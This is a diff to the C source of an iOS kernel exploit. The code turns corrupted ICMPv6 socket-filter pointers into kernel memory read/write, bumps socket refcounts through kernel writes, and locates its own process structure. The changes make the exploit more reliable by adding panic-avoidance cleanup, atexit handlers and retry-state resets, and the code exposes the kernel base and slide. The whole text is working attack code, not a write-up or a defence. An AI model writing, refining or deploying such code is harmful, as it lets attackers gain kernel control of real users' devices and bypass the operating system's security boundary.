@@ -156,10 +156,17 @@ static volatile uint64_t target_object_size;
 
 static char *executable_name;
 
-static int control_socket;
-static int rw_socket;
+/* Bug #506: use -1 as the only invalid FD sentinel.
+ * Some paths treated 0 as invalid while others used <0. If socket fd 0 is
+ * returned, cleanup/abort detection becomes inconsistent. */
+static int control_socket = -1;
+static int rw_socket = -1;
 static uint64_t control_socket_pcb;
 static uint64_t rw_socket_pcb;
+static int g_quarantined_control_socket = -1;
+static int g_quarantined_rw_socket = -1;
+static uint64_t g_quarantined_control_socket_pcb;
+static uint64_t g_quarantined_rw_socket_pcb;
 static bool g_corruption_snapshot_valid;
 static uint64_t g_corruption_snapshot_pcb;
 static uint64_t g_corruption_snapshot_filter_qword0;
@@ -171,6 +178,12 @@ static uint64_t our_proc;
 static uint64_t our_task;
 static bool g_panic_guard_abort_latched;
 static bool g_socket_teardown_hardened;
+static bool g_atexit_cleanup_registered = false;  /* Bug #461: atexit handler guard */
+static bool g_atexit_cleanup_executed = false;    /* Bug #516: atexit one-shot guard */
+static uint64_t g_teardown_socket_allow1_min;
+static uint64_t g_teardown_socket_allow1_max;
+static uint64_t g_teardown_socket_allow2_min;
+static uint64_t g_teardown_socket_allow2_max;
 static int g_proc_read_scope_depth;
 static int g_proc_scope_block_count;
 static bool g_proc_scope_block_latched;
@@ -219,6 +232,73 @@ static uint64_t free_thread_map_fail_count = 0;
 static void restore_corrupted_socket_filter_best_effort(void);
 static void abort_cleanup_corrupted_sockets_best_effort(void);
 static bool park_corrupted_socket_filter_target_to_self(void);
+static bool abort_null_icmp6filt_bypass_and_close(void); /* Bug #481 */
+static void krw_sockets_leak_forever(void); /* Bug #458 */
+
+static void clear_quarantined_socket_state(void) {
+    g_quarantined_control_socket = -1;
+    g_quarantined_rw_socket = -1;
+    g_quarantined_control_socket_pcb = 0;
+    g_quarantined_rw_socket_pcb = 0;
+}
+
+static void set_teardown_socket_allow_windows(uint64_t socket1_addr, uint64_t socket2_addr,
+                                              uint64_t so_usecount_offset) {
+    g_teardown_socket_allow1_min = (socket1_addr + so_usecount_offset) & ~7ULL;
+    g_teardown_socket_allow1_max = g_teardown_socket_allow1_min + 8;
+    g_teardown_socket_allow2_min = (socket2_addr + so_usecount_offset) & ~7ULL;
+    g_teardown_socket_allow2_max = g_teardown_socket_allow2_min + 8;
+}
+
+static void clear_teardown_socket_allow_windows(void) {
+    g_teardown_socket_allow1_min = 0;
+    g_teardown_socket_allow1_max = 0;
+    g_teardown_socket_allow2_min = 0;
+    g_teardown_socket_allow2_max = 0;
+}
+
+static bool restore_quarantined_sockets_for_atexit(void) {
+    if (control_socket >= 0 || rw_socket >= 0) {
+        return true;
+    }
+    if (g_quarantined_control_socket < 0 && g_quarantined_rw_socket < 0) {
+        return false;
+    }
+
+    control_socket = g_quarantined_control_socket;
+    rw_socket = g_quarantined_rw_socket;
+    control_socket_pcb = g_quarantined_control_socket_pcb;
+    rw_socket_pcb = g_quarantined_rw_socket_pcb;
+    pe_log("ds_atexit: restored quarantined sockets for last-chance cleanup (control=%d rw=%d ctrl_pcb=0x%llx rw_pcb=0x%llx)",
+           control_socket, rw_socket, control_socket_pcb, rw_socket_pcb);
+    return true;
+}
+
+/* Bug #461: atexit handler for manual app close cleanup */
+static void ds_atexit_cleanup(void) {
+    if (g_atexit_cleanup_executed) {
+        pe_log("ds_atexit: cleanup already executed once, skipping duplicate call");
+        return;
+    }
+    g_atexit_cleanup_executed = true;
+
+    if (!restore_quarantined_sockets_for_atexit()) {
+        return;
+    }
+
+    pe_log("ds_atexit: manual app close detected, performing last-chance leak-hardening cleanup");
+    krw_sockets_leak_forever();
+    abort_cleanup_corrupted_sockets_best_effort();
+    clear_quarantined_socket_state();
+}
+
+static void ds_register_atexit_cleanup(void) {
+    if (!g_atexit_cleanup_registered) {
+        atexit(ds_atexit_cleanup);
+        g_atexit_cleanup_registered = true;
+        pe_log("ds_register_atexit_cleanup: registered for process exit");
+    }
+}
 
 static inline int fail_after_corruption_cleanup(void) {
     /*
@@ -227,15 +307,35 @@ static inline int fail_after_corruption_cleanup(void) {
      * rollback icmp6filt qword0/qword1 afterwards, terminate-time teardown may
      * still treat that stale embedded slot as a standalone small allocation.
      *
-     * Neutralize the live target first, then do best-effort rollback.
+     * Bug #481: Try null-bypass first to cleanly close sockets. Falls back to
+     * park-at-self + restore + quarantine if the bypass fails.
      */
-    park_corrupted_socket_filter_target_to_self();
-    restore_corrupted_socket_filter_best_effort();
+    if (abort_null_icmp6filt_bypass_and_close()) {
+        pe_log("fail-cleanup: null-bypass succeeded, sockets closed cleanly");
+        return -1;
+    }
+    /* Bug #458: do NOT park target back to self-slot in abort path.
+     * Fresh panics correlate with inpcb+0x148 address on process teardown. */
+    pe_log("fail-cleanup: null-bypass failed; skipping park-self and attempting leak-hardening before quarantine");
+    krw_sockets_leak_forever();
+    if (g_socket_teardown_hardened) {
+        pe_log("fail-cleanup: leak-hardening active; skipping rollback before quarantine");
+    } else {
+        restore_corrupted_socket_filter_best_effort();
+    }
     abort_cleanup_corrupted_sockets_best_effort();
     return -1;
 }
 
 static inline int panic_guard_abort_cleanup(void) {
+    /* Bug #462: Guard against double-call of abort cleanup.
+     * If already latched, skip re-running abort logic to avoid double refcount bump
+     * or double-call issues with krw_sockets_leak_forever(). */
+    if (g_panic_guard_abort_latched) {
+        pe_log("PANIC GUARD: abort cleanup already latched, skipping double-call");
+        return -1;
+    }
+
     g_panic_guard_abort_latched = true;
     /* Bug #301: once krw_sockets_leak_forever() has already installed the
      * teardown hardening, panic-guard abort must NOT restore icmp6filt back
@@ -245,13 +345,13 @@ static inline int panic_guard_abort_cleanup(void) {
      *
      * At that stage the safer policy is:
      * - keep the leak/refcount hardening in place
-     * - park the corrupted filter target back onto its self-slot
+     * - do NOT re-park/write any additional target slots
      * - quarantine the fds / global pcb state
      * - skip rollback of icmp6filt entirely
      */
     if (g_socket_teardown_hardened) {
         pe_log("PANIC GUARD: leak-hardening already active — skipping icmp6filt rollback");
-        park_corrupted_socket_filter_target_to_self();
+        pe_log("PANIC GUARD: skipping park-self in hardened abort path");
         abort_cleanup_corrupted_sockets_best_effort();
         return -1;
     }
@@ -265,12 +365,20 @@ static inline int panic_guard_abort_cleanup(void) {
      * post-abort write-back into the embedded icmp6filt slot. For panic-guard
      * failures after successful early KRW but before success-only hardening,
      * the safer policy now matches the leak-hardened branch:
-     * - park target back onto self-slot
-     * - skip rollback entirely
+     * - do NOT perform any additional park/retarget writes
+     * - skip rollback entirely when hardening is active
      * - quarantine fds / pcb globals without close
      */
-    pe_log("PANIC GUARD: pre-hardened abort — skipping icmp6filt rollback, parking self target and quarantining fds");
-    park_corrupted_socket_filter_target_to_self();
+    pe_log("PANIC GUARD: pre-hardened abort — attempting null-bypass cleanup first");
+    /* Bug #481: Try to NULL both icmp6filt pointers and close sockets cleanly.
+     * This prevents zone-confusion panics when the process exits and kernel closes fds.
+     * Falls back to park-at-self + quarantine if the bypass fails. */
+    if (abort_null_icmp6filt_bypass_and_close()) {
+        pe_log("PANIC GUARD: null-bypass succeeded, sockets closed cleanly, no quarantine needed");
+        return -1;
+    }
+    pe_log("PANIC GUARD: null-bypass failed — attempting leak-hardening, then quarantine without park-self");
+    krw_sockets_leak_forever();
     abort_cleanup_corrupted_sockets_best_effort();
     return -1;
 }
@@ -304,6 +412,8 @@ static void close_target_fds(void) {
 
 static void reset_transient_state(void) {
     close_target_fds();
+    clear_quarantined_socket_state();
+    clear_teardown_socket_allow_windows();
     socket_ports_count = 0;
     target_inp_gencnt_count = 0;
     highest_success_idx = 0;
@@ -320,6 +430,12 @@ static void reset_transient_state(void) {
     g_corruption_snapshot_filter_qword0 = 0;
     g_corruption_snapshot_filter_qword1 = 0;
     g_socket_teardown_hardened = false;
+    /* Bug #507: make retries deterministic by always clearing proc-scope guard
+     * state between attempts. If a prior run exits with unmatched scope nesting,
+     * stale depth/latch can poison the next run's allproc traversal. */
+    g_proc_read_scope_depth = 0;
+    g_proc_scope_block_count = 0;
+    g_proc_scope_block_latched = false;
     read_fd = -1;
     write_fd = -1;
 
@@ -938,8 +1054,7 @@ static bool set_target_kaddr(uint64_t where) {
             uint64_t zone_anchor_span = (g_proc_read_scope_depth > 0)
                                       ? 0x300000000ULL /* 12GB */
                                       : 0x100000000ULL; /* 4GB */
-            uint64_t anchor_min = (rw_socket_pcb > zone_anchor_span) ?
-                                  (rw_socket_pcb - zone_anchor_span) : g_zone_map_min;
+            uint64_t anchor_min;
             /* Bug #447: in proc-scope, allow any zone-valid address up to zone_guard_max.
              * On 21D61 A12Z the allproc chain can contain proc structs up to ~14GB above
              * rw_socket_pcb (near the top of the 24GB zone_map). The ±12GB upper limit
@@ -948,8 +1063,11 @@ static bool set_target_kaddr(uint64_t where) {
              * walk the chain. Apply the span-based upper limit only outside proc-scope. */
             uint64_t anchor_max;
             if (g_proc_read_scope_depth > 0) {
+                anchor_min = zone_guard_min; /* full lower guarded zone extent */
                 anchor_max = zone_guard_max; /* full upper zone_map extent */
             } else {
+                anchor_min = (rw_socket_pcb > zone_anchor_span) ?
+                             (rw_socket_pcb - zone_anchor_span) : g_zone_map_min;
                 anchor_max = rw_socket_pcb + zone_anchor_span;
                 if (anchor_max < rw_socket_pcb || anchor_max > zone_guard_max) {
                     anchor_max = zone_guard_max;
@@ -959,13 +1077,21 @@ static bool set_target_kaddr(uint64_t where) {
                 anchor_min = zone_guard_min;
             }
             if (anchor_min >= anchor_max || where < anchor_min || where >= anchor_max) {
-                pe_log("set_target_kaddr: BLOCKED zone addr outside rw_socket_pcb anchor window [0x%llx,0x%llx) (rw=0x%llx): 0x%llx",
-                       anchor_min, anchor_max, rw_socket_pcb, where);
-                if (g_proc_read_scope_depth > 0 && !g_proc_scope_block_latched && ++g_proc_scope_block_count >= k_proc_scope_block_trip_threshold) {
-                    g_proc_scope_block_latched = true;
-                    pe_log("set_target_kaddr: PANIC GUARD tripped in proc-scope after %d blocked candidates", g_proc_scope_block_count);
+                bool allowed_teardown_socket_refcount =
+                    (g_teardown_socket_allow1_min && where >= g_teardown_socket_allow1_min && where < g_teardown_socket_allow1_max) ||
+                    (g_teardown_socket_allow2_min && where >= g_teardown_socket_allow2_min && where < g_teardown_socket_allow2_max);
+                if (allowed_teardown_socket_refcount) {
+                    pe_log("set_target_kaddr: allowing teardown socket refcount addr outside anchor window (rw=0x%llx where=0x%llx)",
+                           rw_socket_pcb, where);
+                } else {
+                    pe_log("set_target_kaddr: BLOCKED zone addr outside rw_socket_pcb anchor window [0x%llx,0x%llx) (rw=0x%llx): 0x%llx",
+                           anchor_min, anchor_max, rw_socket_pcb, where);
+                    if (g_proc_read_scope_depth > 0 && !g_proc_scope_block_latched && ++g_proc_scope_block_count >= k_proc_scope_block_trip_threshold) {
+                        g_proc_scope_block_latched = true;
+                        pe_log("set_target_kaddr: PANIC GUARD tripped in proc-scope after %d blocked candidates", g_proc_scope_block_count);
+                    }
+                    return false;
                 }
-                return false;
             }
         }
     }
@@ -1048,6 +1174,116 @@ static bool set_target_kaddr(uint64_t where) {
                           control_data, (socklen_t)EARLY_KRW_LENGTH);
     if (res != 0) { pe_log("setsockopt failed (set_target_kaddr)!"); return false; }
     return true;
+}
+
+/*
+ * Bug #481: When rw_socket_pcb is in a low zone (GEN0/GEN1, below g_zone_safe_min),
+ * set_target_kaddr rejects the icmp6filt field address, so park_corrupted_socket_filter_target_to_self
+ * fails. Both sockets are left with corrupted in6p_icmp6filt pointers that trigger zone-confusion
+ * kernel panics when the process exits and the kernel closes them (kfree of wrong-zone pointer).
+ *
+ * Fix: bypass the zone guard entirely for the abort cleanup path. Use raw setsockopt calls
+ * (without set_target_kaddr) to write NULL to both in6p_icmp6filt fields, then close both
+ * sockets safely. The kernel skip the free if in6p_icmp6filt == NULL.
+ *
+ * Mechanism:
+ *   - control->icmp6filt is exploit-redirected to rw's PCB[0x148] slot.
+ *   - setsockopt(control, {0,...}) writes 0 to rw's PCB[0x148] → rw->in6p_icmp6filt = NULL
+ *   - setsockopt(control, {ctrl_pcb+0x148,...}) → rw->in6p_icmp6filt = ctrl's slot addr
+ *   - setsockopt(rw, {0,...}) writes 0 to ctrl's PCB[0x148] → ctrl->in6p_icmp6filt = NULL
+ *   - setsockopt(control, {0,...}) restores rw->in6p_icmp6filt = NULL
+ *   Both icmp6filt = NULL → close() is safe, no wrong-zone free, no panic.
+ */
+static bool abort_null_icmp6filt_bypass_and_close(void) {
+    const uint64_t icmp6filt_offset = 0x148;
+    uint64_t ctrl_slot = control_socket_pcb + icmp6filt_offset;
+    uint64_t rw_slot = rw_socket_pcb + icmp6filt_offset;
+    bool control_ok = false;
+    bool rw_ok = false;
+
+    if (control_socket < 0 || rw_socket < 0 || !rw_socket_pcb) {
+        pe_log("abort-null-bypass: skipped (sockets invalid, pcb=0x%llx)", rw_socket_pcb);
+        return false;
+    }
+    if (!control_socket_pcb) {
+        pe_log("abort-null-bypass: skipped (control_socket_pcb=0)");
+        return false;
+    }
+
+    pe_log("abort-null-bypass: begin (ctrl_pcb=0x%llx rw_pcb=0x%llx ctrl_slot=0x%llx rw_slot=0x%llx)",
+           control_socket_pcb, rw_socket_pcb, ctrl_slot, rw_slot);
+
+    /* Step 1: control -> rw_slot = NULL */
+    {
+        unsigned char payload[EARLY_KRW_LENGTH];
+        memset(payload, 0, sizeof(payload));
+        if (setsockopt(control_socket, IPPROTO_ICMPV6, ICMP6_FILTER,
+                       payload, (socklen_t)sizeof(payload)) == 0) {
+            control_ok = true;
+        } else {
+            pe_log("abort-null-bypass: step1 failed (control->rw_slot=NULL)");
+            goto out;
+        }
+    }
+
+    /* Step 2: control -> rw_slot = ctrl_slot */
+    {
+        unsigned char payload[EARLY_KRW_LENGTH];
+        memset(payload, 0, sizeof(payload));
+        *(uint64_t *)payload = ctrl_slot;
+        if (setsockopt(control_socket, IPPROTO_ICMPV6, ICMP6_FILTER,
+                       payload, (socklen_t)sizeof(payload)) == 0) {
+            control_ok = true;
+        } else {
+            pe_log("abort-null-bypass: step2 failed (control->rw_slot=ctrl_slot)");
+            goto out;
+        }
+    }
+
+    /* Step 3: rw -> ctrl_slot = NULL */
+    {
+        unsigned char payload[EARLY_KRW_LENGTH];
+        memset(payload, 0, sizeof(payload));
+        if (setsockopt(rw_socket, IPPROTO_ICMPV6, ICMP6_FILTER,
+                       payload, (socklen_t)sizeof(payload)) == 0) {
+            rw_ok = true;
+        } else {
+            pe_log("abort-null-bypass: step3 failed (rw->ctrl_slot=NULL)");
+            goto out;
+        }
+    }
+
+    /* Step 4: control -> rw_slot = NULL (final) */
+    {
+        unsigned char payload[EARLY_KRW_LENGTH];
+        memset(payload, 0, sizeof(payload));
+        if (setsockopt(control_socket, IPPROTO_ICMPV6, ICMP6_FILTER,
+                       payload, (socklen_t)sizeof(payload)) == 0) {
+            control_ok = true;
+        } else {
+            pe_log("abort-null-bypass: step4 failed (control->rw_slot=NULL final)");
+            goto out;
+        }
+    }
+
+out:
+    if (!control_ok || !rw_ok) {
+        pe_log("abort-null-bypass: failed, sockets left open for quarantine");
+        return false;
+    }
+
+    int cfd = control_socket;
+    int rfd = rw_socket;
+    control_socket = -1;
+    rw_socket = -1;
+    if (cfd >= 0) close(cfd);
+    if (rfd >= 0) close(rfd);
+    control_socket_pcb = 0;
+    rw_socket_pcb = 0;
+
+    pe_log("abort-null-bypass: success, both sockets closed after dual NULLing");
+    return true;
+
 }
 
 static bool park_corrupted_socket_filter_target_to_self(void) {
@@ -1293,7 +1529,8 @@ static void discover_zone_boundaries_raw(uint64_t ipi_zone_addr) {
         addr &= ~(CHUNK - 1);  /* align down to page */
         if (addr < 0xfffffff000000000ULL) break;
 
-        if (back_chunks % 16 == 0) {
+        /* Bug #501: log every 64 chunks (4MB) instead of 16 (1MB) to reduce DiskWrites */
+        if (back_chunks % 64 == 0) {
             pe_log("zone scan backward: %lluKB / %lluKB", dist / 1024, BACK / 1024);
         }
         back_chunks++;
@@ -1330,7 +1567,8 @@ static void discover_zone_boundaries_raw(uint64_t ipi_zone_addr) {
         uint64_t addr = (ipi_zone_addr + dist) & ~(CHUNK - 1);
         if (addr >= 0xffffffff00000000ULL) break;
 
-        if (fwd_chunks % 16 == 0) {
+        /* Bug #501: log every 64 chunks (4MB) to reduce DiskWrites */
+        if (fwd_chunks % 64 == 0) {
             pe_log("zone scan forward: %lluKB / %lluKB", dist / 1024, FWD / 1024);
         }
         fwd_chunks++;
@@ -1583,7 +1821,6 @@ static int64_t find_and_corrupt_socket(mach_port_t memory_object, uint64_t seeki
             rw_socket = fileport_makefd(socket_ports[control_socket_idx + 1]);
             if (rw_socket < 0) {
                 pe_log("fileport_makefd failed for rw socket idx %lld", control_socket_idx + 1);
-                control_socket = -1;
                 return fail_after_corruption_cleanup();
             }
             return KERN_SUCCESS;
@@ -1680,8 +1917,10 @@ static void krw_sockets_leak_forever(void) {
     const uint64_t icmp6filt_offset    = 0x148;
     const uint32_t refcount_bump       = 0x1001;   /* bump by 4097 */
 
-    pe_log("krw leak: using so_usecount offset 0x%llx, so_retaincnt offset 0x%llx (iOS %d)",
-           so_usecount_offset, so_retaincnt_offset, ios_ver);
+        pe_log("krw leak: using so_usecount offset 0x%llx, so_retaincnt offset 0x%llx (iOS %d)",
+            so_usecount_offset, so_retaincnt_offset, ios_ver);
+
+        clear_teardown_socket_allow_windows();
 
     /* REQUIRE zone bounds — if discovery completely failed, skip leak */
     if (!g_zone_map_min || !g_zone_map_max) {
@@ -1708,6 +1947,8 @@ static void krw_sockets_leak_forever(void) {
 
     pe_log("krw leak: control_socket=0x%llx rw_socket=0x%llx",
            control_socket_addr, rw_socket_addr);
+
+    set_teardown_socket_allow_windows(control_socket_addr, rw_socket_addr, so_usecount_offset);
 
     /* --- Read so_usecount (32-bit) via aligned helper --- */
     uint32_t ctrl_usecount = 0, rw_usecount = 0;
@@ -1738,24 +1979,36 @@ static void krw_sockets_leak_forever(void) {
         do_bump = false;
     }
 
-    if (do_bump) {
-        /* Bump so_usecount (32-bit write, does NOT touch adjacent field) */
-        kwrite32_aligned(control_socket_addr + so_usecount_offset, ctrl_usecount + refcount_bump);
-        kwrite32_aligned(rw_socket_addr + so_usecount_offset, rw_usecount + refcount_bump);
-
-        /* Bump so_retaincnt IF it also looks valid */
-        if (ctrl_ret_ok && ctrl_retaincnt > 0 && ctrl_retaincnt < 0x10000) {
-            kwrite32_aligned(control_socket_addr + so_retaincnt_offset, ctrl_retaincnt + refcount_bump);
-        } else {
-            pe_log("krw leak: skip ctrl so_retaincnt bump (val=%u ok=%d)", ctrl_retaincnt, ctrl_ret_ok);
-        }
-        if (rw_ret_ok && rw_retaincnt > 0 && rw_retaincnt < 0x10000) {
-            kwrite32_aligned(rw_socket_addr + so_retaincnt_offset, rw_retaincnt + refcount_bump);
-        } else {
-            pe_log("krw leak: skip rw so_retaincnt bump (val=%u ok=%d)", rw_retaincnt, rw_ret_ok);
-        }
-        pe_log("krw leak: refcount bumped OK (usecount += 0x%x)", refcount_bump);
+    if (!do_bump) {
+        pe_log("krw leak: hardening NOT applied (do_bump=0) — keeping rollback path enabled");
+        clear_teardown_socket_allow_windows();
+        return;
     }
+
+    /* Bug #460: Verify kwrite success before setting hardening flag.
+     * Bump so_usecount (32-bit write, does NOT touch adjacent field) */
+    bool ctrl_write_ok = kwrite32_aligned(control_socket_addr + so_usecount_offset, ctrl_usecount + refcount_bump);
+    bool rw_write_ok   = kwrite32_aligned(rw_socket_addr + so_usecount_offset, rw_usecount + refcount_bump);
+
+    if (!ctrl_write_ok || !rw_write_ok) {
+        pe_log("krw leak: FAILED — so_usecount write failed (ctrl=%d rw=%d), keeping rollback enabled",
+               ctrl_write_ok, rw_write_ok);
+        clear_teardown_socket_allow_windows();
+        return;
+    }
+
+    /* Bump so_retaincnt IF it also looks valid */
+    if (ctrl_ret_ok && ctrl_retaincnt > 0 && ctrl_retaincnt < 0x10000) {
+        kwrite32_aligned(control_socket_addr + so_retaincnt_offset, ctrl_retaincnt + refcount_bump);
+    } else {
+        pe_log("krw leak: skip ctrl so_retaincnt bump (val=%u ok=%d)", ctrl_retaincnt, ctrl_ret_ok);
+    }
+    if (rw_ret_ok && rw_retaincnt > 0 && rw_retaincnt < 0x10000) {
+        kwrite32_aligned(rw_socket_addr + so_retaincnt_offset, rw_retaincnt + refcount_bump);
+    } else {
+        pe_log("krw leak: skip rw so_retaincnt bump (val=%u ok=%d)", rw_retaincnt, rw_ret_ok);
+    }
+    pe_log("krw leak: refcount bumped OK (usecount += 0x%x)", refcount_bump);
 
     /*
      * Clear the second qword of the corrupted filter so socket teardown does
@@ -1765,8 +2018,10 @@ static void krw_sockets_leak_forever(void) {
 
     /* Bug #301: once the leak/refcount patch is applied successfully, treat
      * the corrupted sockets as permanently leak-owned for this process.
-     * Later panic-guard abort must not rollback icmp6filt on top of this. */
+     * Later panic-guard abort must not rollback icmp6filt on top of this.
+     * Bug #460: ONLY set hardening flag if kwrite succeeded (verified above). */
     g_socket_teardown_hardened = true;
+    clear_teardown_socket_allow_windows();
 
     pe_log("krw leak: refcount patch applied successfully");
 }
@@ -1813,6 +2068,8 @@ static void restore_corrupted_socket_filter_best_effort(void) {
 static void abort_cleanup_corrupted_sockets_best_effort(void) {
     int local_control_socket = control_socket;
     int local_rw_socket = rw_socket;
+    uint64_t local_control_socket_pcb = control_socket_pcb;
+    uint64_t local_rw_socket_pcb = rw_socket_pcb;
 
     if (local_control_socket < 0 && local_rw_socket < 0) {
         pe_log("abort-cleanup: no live socket fds");
@@ -1821,6 +2078,15 @@ static void abort_cleanup_corrupted_sockets_best_effort(void) {
 
     pe_log("abort-cleanup: quarantine sockets without close (control=%d rw=%d)",
            local_control_socket, local_rw_socket);
+
+        ds_register_atexit_cleanup();
+        g_quarantined_control_socket = local_control_socket;
+        g_quarantined_rw_socket = local_rw_socket;
+        g_quarantined_control_socket_pcb = local_control_socket_pcb;
+        g_quarantined_rw_socket_pcb = local_rw_socket_pcb;
+        pe_log("abort-cleanup: preserved quarantined sockets for atexit (control=%d rw=%d ctrl_pcb=0x%llx rw_pcb=0x%llx)",
+            g_quarantined_control_socket, g_quarantined_rw_socket,
+            g_quarantined_control_socket_pcb, g_quarantined_rw_socket_pcb);
 
     /*
      * Bug #281: close-time panic still reproduced on some guard-abort sessions
@@ -2043,7 +2309,7 @@ static void pe_v1(void) {
         pe_log("pe_v1: retrying ds... (%d/%d)", attempt, MAX_PE_V1_ATTEMPTS);
     }
 
-    if (control_socket == 0 || rw_socket == 0) {
+    if (control_socket < 0 || rw_socket < 0) {
         pe_log("pe_v1: exploit failed after %d attempts", MAX_PE_V1_ATTEMPTS);
     }
 
@@ -2220,7 +2486,7 @@ static void pe_v2(void) {
         pe_log("retrying ds (a18 path) (%d/%d)", attempt, MAX_PE_V2_ATTEMPTS);
     }
 
-    if (control_socket == 0 || rw_socket == 0) {
+    if (control_socket < 0 || rw_socket < 0) {
         pe_log("pe_v2: exploit failed after %d attempts", MAX_PE_V2_ATTEMPTS);
     }
 
@@ -2401,6 +2667,10 @@ static int pe(void) {
     our_proc = ourproc();
     pe_log("returned from ourproc(): 0x%llx", our_proc);
     if (!our_proc) {
+        pe_log("ourproc diagnostics: rw_pcb=0x%llx zone=[0x%llx,0x%llx) safe_min=0x%llx proc_scope(depth=%d blocked=%d latched=%d)",
+               rw_socket_pcb, g_zone_map_min, g_zone_map_max, g_zone_safe_min,
+               g_proc_read_scope_depth, g_proc_scope_block_count,
+               g_proc_scope_block_latched ? 1 : 0);
         pe_log("PANIC GUARD: ourproc() failed (0x0) - aborting run before post-exploit phases");
         panic_guard_abort_cleanup();
         g_ds_ready = false;
@@ -2426,6 +2696,13 @@ static int pe(void) {
     krw_sockets_leak_forever();
     pe_log("returned from krw_sockets_leak_forever()");
 
+    if (!g_socket_teardown_hardened) {
+        pe_log("PANIC GUARD: leak-hardening did not arm, aborting success path to avoid manual-close reboot");
+        panic_guard_abort_cleanup();
+        g_ds_ready = false;
+        return -1;
+    }
+
     g_ds_ready = true;
 
     pe_log("our_proc: 0x%llx", our_proc);
@@ -2442,6 +2719,7 @@ int ds_run(void) {
     g_free_thread_should_exit = false;
     g_free_thread_created = false;
     g_panic_guard_abort_latched = false;
+    g_atexit_cleanup_executed = false;
     reset_transient_state();
 
     /* Reset state from any previous attempt to prevent double-corruption.
@@ -2449,12 +2727,12 @@ int ds_run(void) {
      * that socket must not be reused — closing it might trigger
      * kernel panic from stale icmp6filt pointer. We intentionally
      * leave old corrupted sockets open (they're leaked by design). */
-    if (control_socket > 0 || rw_socket > 0) {
+    if (control_socket >= 0 || rw_socket >= 0) {
         pe_log("WARNING: previous attempt left sockets open (control=%d rw=%d) — leaking them",
                control_socket, rw_socket);
     }
-    control_socket = 0;
-    rw_socket = 0;
+    control_socket = -1;
+    rw_socket = -1;
     control_socket_pcb = 0;
     rw_socket_pcb = 0;
     kernel_base = 0;
@@ -2484,12 +2762,50 @@ int ds_run(void) {
         result = -2;
     }
 
+    /* Bug #461: Register atexit cleanup if exploit was successful and sockets exist.
+     * This ensures manual app close will trigger leak-hardening and quarantine logic
+     * instead of kernel teardown panicking on corrupted icmp6filt. */
+    if (result == 0 && (control_socket >= 0 || rw_socket >= 0)) {
+        ds_register_atexit_cleanup();
+        g_ds_ready = true;
+        pe_log("ds_run: exploit successful, atexit handler registered for manual close safety");
+    }
+
     free(default_file_content);
     default_file_content = NULL;
     return result;
 }
 
 bool ds_is_ready(void)          { return g_ds_ready; }
+bool ds_prepare_failure_exit_cleanup(void) {
+    if (g_ds_ready) {
+        pe_log("ds_failure_exit: skipped (session already marked ready)");
+        return false;
+    }
+
+    if (g_atexit_cleanup_executed) {
+        pe_log("ds_failure_exit: cleanup already executed earlier, skipping duplicate lifecycle call");
+        return true;
+    }
+
+    if (!restore_quarantined_sockets_for_atexit()) {
+        pe_log("ds_failure_exit: no quarantined/live sockets to clean on lifecycle exit");
+        return false;
+    }
+
+    pe_log("ds_failure_exit: lifecycle-triggered late cleanup for failure/panic-guard session");
+    if (abort_null_icmp6filt_bypass_and_close()) {
+        pe_log("ds_failure_exit: late null-bypass succeeded, skipping later atexit restore");
+        g_atexit_cleanup_executed = true;
+        reset_transient_state();
+        return true;
+    }
+
+    pe_log("ds_failure_exit: late null-bypass failed, restoring quarantine for existing atexit fallback");
+    abort_cleanup_corrupted_sockets_best_effort();
+    return false;
+}
+
 uint64_t ds_get_kernel_base(void)  { return kernel_base; }
 uint64_t ds_get_kernel_slide(void) { return kernel_slide; }
 
